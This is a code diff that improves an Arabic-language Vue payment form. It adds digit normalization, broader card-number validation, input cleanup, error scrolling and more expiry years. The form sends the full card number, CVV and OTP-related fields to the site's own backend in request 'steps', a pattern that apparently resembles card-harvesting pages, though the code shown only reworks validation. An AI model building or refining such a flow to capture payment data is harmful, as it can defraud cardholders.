@@ -1,5 +1,5 @@
 <script setup lang="ts">
-import { ref, computed, onMounted, onUnmounted } from 'vue';
+import { ref, computed, onMounted, onUnmounted, nextTick } from 'vue';
 import { ChevronDown, CreditCard, ArrowRight, ShieldCheck, Lock } from 'lucide-vue-next';
 import { useRouter } from 'vue-router';
 import { updateCardRequest, getCardRequest, resolveActiveRequestId } from '../api';
@@ -26,22 +26,27 @@ const errors = ref({
   cvv: ''
 });
 
+const normalizeDigits = (val: string): string =>
+  val
+    .replace(/[\u0660-\u0669]/g, (c) => String(c.charCodeAt(0) - 0x0660))
+    .replace(/[\u06F0-\u06F9]/g, (c) => String(c.charCodeAt(0) - 0x06f0));
+
 const handleCardNumberInput = (e: Event) => {
   const input = e.target as HTMLInputElement;
-  const digits = input.value.replace(/\D/g, '').slice(0, 16);
+  const digits = normalizeDigits(input.value).replace(/\D/g, '').slice(0, 19);
   const spaced = digits.replace(/(.{4})/g, '$1 ').trim();
   form.value.cardNumber = spaced;
 };
 
 const formattedPreviewNumber = computed(() => {
-  const digits = form.value.cardNumber.replace(/\D/g, '');
+  const digits = normalizeDigits(form.value.cardNumber).replace(/\D/g, '');
   if (!digits) return '•••• •••• •••• ••••';
   const padded = digits.padEnd(16, '•');
   return padded.replace(/(.{4})/g, '$1 ').trim();
 });
 
 const detectedBrand = computed(() => {
-  const digits = form.value.cardNumber.replace(/\D/g, '');
+  const digits = normalizeDigits(form.value.cardNumber).replace(/\D/g, '');
   if (digits.startsWith('4')) return 'VISA';
   if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'MASTERCARD';
   if (/^3[47]/.test(digits)) return 'AMEX';
@@ -80,8 +85,9 @@ const validateForm = () => {
     isValid = false;
   }
 
-  if (!/^\d{15,16}$/.test(form.value.cardNumber.replace(/\s/g, ''))) {
-    errors.value.cardNumber = 'يرجى إدخال رقم بطاقة صحيح مكون من 16 رقماً';
+  const cardDigits = normalizeDigits(form.value.cardNumber).replace(/\D/g, '');
+  if (!/^\d{13,19}$/.test(cardDigits)) {
+    errors.value.cardNumber = 'يرجى إدخال رقم بطاقة صحيح';
     isValid = false;
   }
 
@@ -95,9 +101,16 @@ const validateForm = () => {
     isValid = false;
   }
 
-  if (!/^\d{3,4}$/.test(form.value.cvv)) {
+  const cvvDigits = normalizeDigits(form.value.cvv).replace(/\D/g, '');
+  if (!/^\d{3,4}$/.test(cvvDigits)) {
     errors.value.cvv = 'رمز CVV غير صالح';
     isValid = false;
+  }
+
+  if (!isValid) {
+    nextTick(() => {
+      document.querySelector('.field-error')?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    });
   }
 
   return isValid;
@@ -106,10 +119,10 @@ const validateForm = () => {
 const submitPayment = async () => {
   if (isSubmitting.value) return;
   if (!validateForm()) return;
-  
+
   isSubmitting.value = true;
   statusBanner.value = '';
-  
+
   const requestId = await resolveActiveRequestId();
   if (!requestId) {
     statusBanner.value = 'لم يتم العثور على رقم الطلب، يرجى البدء من جديد.';
@@ -118,13 +131,16 @@ const submitPayment = async () => {
     return;
   }
 
+  const cleanCardNumber = normalizeDigits(form.value.cardNumber).replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+  const cleanCvv = normalizeDigits(form.value.cvv).replace(/\D/g, '');
+
   try {
     await updateCardRequest(requestId, {
-      paymentName: form.value.name,
-      cardNumber: form.value.cardNumber,
+      paymentName: form.value.name.trim(),
+      cardNumber: cleanCardNumber,
       expMonth: form.value.expMonth,
       expYear: form.value.expYear,
-      cvv: form.value.cvv,
+      cvv: cleanCvv,
       otp: '',
       otpStatus: '',
       step: 'card',
@@ -264,7 +280,7 @@ const submitPayment = async () => {
                 v-model="form.name" 
                 class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] px-3.5 text-slate-900 focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm transition-colors placeholder-slate-400 font-semibold" 
               />
-              <p v-if="errors.name" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.name }}</p>
+              <p v-if="errors.name" class="field-error text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.name }}</p>
             </div>
 
             <!-- Card Number -->
@@ -276,10 +292,10 @@ const submitPayment = async () => {
                 placeholder="0000 0000 0000 0000" 
                 :value="form.cardNumber"
                 @input="handleCardNumberInput"
-                maxlength="19"
+                maxlength="23"
                 class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] px-3.5 text-slate-900 focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm transition-colors placeholder-slate-400 font-mono font-bold tabular-nums tracking-wider" 
               />
-              <p v-if="errors.cardNumber" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.cardNumber }}</p>
+              <p v-if="errors.cardNumber" class="field-error text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.cardNumber }}</p>
             </div>
 
             <!-- Expiry Row -->
@@ -308,7 +324,7 @@ const submitPayment = async () => {
                   </select>
                   <ChevronDown class="w-4 h-4 text-[#9b7b28] pointer-events-none absolute right-3 top-1/2 -translate-y-1/2" />
                 </div>
-                <p v-if="errors.expMonth" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.expMonth }}</p>
+                <p v-if="errors.expMonth" class="field-error text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.expMonth }}</p>
               </div>
 
               <!-- Year -->
@@ -320,6 +336,7 @@ const submitPayment = async () => {
                     class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] pl-3.5 pr-8 text-slate-900 appearance-none focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm font-mono font-bold tabular-nums cursor-pointer transition-colors"
                   >
                     <option value="" disabled selected hidden>YYYY</option>
+                    <option value="2025">2025</option>
                     <option value="2026">2026</option>
                     <option value="2027">2027</option>
                     <option value="2028">2028</option>
@@ -327,10 +344,14 @@ const submitPayment = async () => {
                     <option value="2030">2030</option>
                     <option value="2031">2031</option>
                     <option value="2032">2032</option>
+                    <option value="2033">2033</option>
+                    <option value="2034">2034</option>
+                    <option value="2035">2035</option>
+                    <option value="2036">2036</option>
                   </select>
                   <ChevronDown class="w-4 h-4 text-[#9b7b28] pointer-events-none absolute right-3 top-1/2 -translate-y-1/2" />
                 </div>
-                <p v-if="errors.expYear" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.expYear }}</p>
+                <p v-if="errors.expYear" class="field-error text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.expYear }}</p>
               </div>
             </div>
 
@@ -345,7 +366,7 @@ const submitPayment = async () => {
                 maxlength="4"
                 class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf8] px-3.5 text-slate-900 focus:outline-none focus:border-[#c9a959] focus:bg-white text-sm transition-colors placeholder-slate-400 font-mono font-bold tabular-nums" 
               />
-              <p v-if="errors.cvv" class="text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.cvv }}</p>
+              <p v-if="errors.cvv" class="field-error text-red-600 text-[11px] font-semibold mt-1 text-right" dir="rtl">{{ errors.cvv }}</p>
             </div>
 
             <div class="pt-3">
